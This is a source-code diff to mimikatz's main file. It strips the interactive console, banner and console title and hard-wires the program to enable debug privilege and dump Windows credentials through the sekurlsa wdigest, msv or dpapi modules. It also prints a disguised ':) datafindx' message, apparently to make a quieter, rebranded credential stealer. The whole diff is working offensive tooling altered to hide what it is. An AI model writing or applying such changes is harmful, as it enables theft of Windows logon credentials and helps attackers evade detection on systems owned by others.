@@ -4,6 +4,7 @@
 	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "mimikatz.h"
+//#include <fstream>
 
 const KUHL_M * mimikatz_modules[] = {
 	&kuhl_m_standard,
@@ -36,62 +37,38 @@ const KUHL_M * mimikatz_modules[] = {
 
 int wmain(int argc, wchar_t * argv[])
 {
-	NTSTATUS status = STATUS_SUCCESS;
-	int i;
-#if !defined(_POWERKATZ)
-	size_t len;
-	wchar_t input[0xffff];
-#endif
+	if (argc != 2)
+	{
+		kprintf(L":) datafindx");
+		return -1;
+	}
 	mimikatz_begin();
-	for(i = MIMIKATZ_AUTO_COMMAND_START ; (i < argc) && (status != STATUS_FATAL_APP_EXIT) ; i++)
+	mimikatz_dispatchCommand(L"privilege::debug");
+	if (wcscmp(argv[1],L"wdigest") == 0)
 	{
-		kprintf(L"\n" MIMIKATZ L"(" MIMIKATZ_AUTO_COMMAND_STRING L") # %s\n", argv[i]);
-		status = mimikatz_dispatchCommand(argv[i]);
+		mimikatz_dispatchCommand(L"sekurlsa::wdigest");
 	}
-#if !defined(_POWERKATZ)
-	while (status != STATUS_FATAL_APP_EXIT)
+	else if (wcscmp(argv[1], L"msv") == 0)
 	{
-		kprintf(L"\n" MIMIKATZ L" # "); fflush(stdin);
-		if(fgetws(input, ARRAYSIZE(input), stdin) && (len = wcslen(input)) && (input[0] != L'\n'))
-		{
-			if(input[len - 1] == L'\n')
-				input[len - 1] = L'\0';
-			kprintf_inputline(L"%s\n", input);
-			status = mimikatz_dispatchCommand(input);
-		}
+		mimikatz_dispatchCommand(L"sekurlsa::msv");
 	}
-#endif
+	else
+	{
+		mimikatz_dispatchCommand(L"sekurlsa::dpapi");
+		kuhl_m_dpapi_cred(argc, argv);
+	}
 	mimikatz_end();
 	return STATUS_SUCCESS;
 }
 
 void mimikatz_begin()
 {
-	kull_m_output_init();
-#if !defined(_POWERKATZ)
-	SetConsoleTitle(MIMIKATZ L" " MIMIKATZ_VERSION L" " MIMIKATZ_ARCH L" (oe.eo)");
-	SetConsoleCtrlHandler(HandlerRoutine, TRUE);
-#endif
-	kprintf(L"\n"
-		L"  .#####.   " MIMIKATZ_FULL L"\n"
-		L" .## ^ ##.  " MIMIKATZ_SECOND L" - (oe.eo)\n"
-		L" ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
-		L" ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n"
-		L" '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n"
-		L"  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n");
 	mimikatz_initOrClean(TRUE);
 }
 
 void mimikatz_end()
 {
 	mimikatz_initOrClean(FALSE);
-#if !defined(_POWERKATZ)
-	SetConsoleCtrlHandler(HandlerRoutine, FALSE);
-#endif
-	kull_m_output_clean();
-#if !defined(_WINDLL)
-	ExitProcess(STATUS_SUCCESS);
-#endif
 }
 
 BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
